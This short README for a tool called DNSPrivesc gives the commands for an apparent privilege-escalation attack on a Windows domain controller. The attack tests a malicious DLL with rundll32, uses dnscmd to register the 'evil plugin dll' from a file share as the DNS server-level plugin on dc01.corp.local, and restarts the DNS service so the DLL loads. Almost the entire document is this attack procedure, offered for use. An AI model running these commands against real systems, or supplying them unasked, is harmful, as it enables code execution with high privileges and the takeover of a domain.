# DNSPrivesc

## Using the DLL

Build and test
```
rundll32.exe .\DNSPrivesc.dll,DnsPluginInitialize
```
Upload evil plugin dll
```
dnscmd dc01.corp.local /config /serverlevelplugindll \\fileshare\dnsprivesc.dll
```
Restart DNS service to apply the evil DLL
```
sc stop dns
sc start dns
```
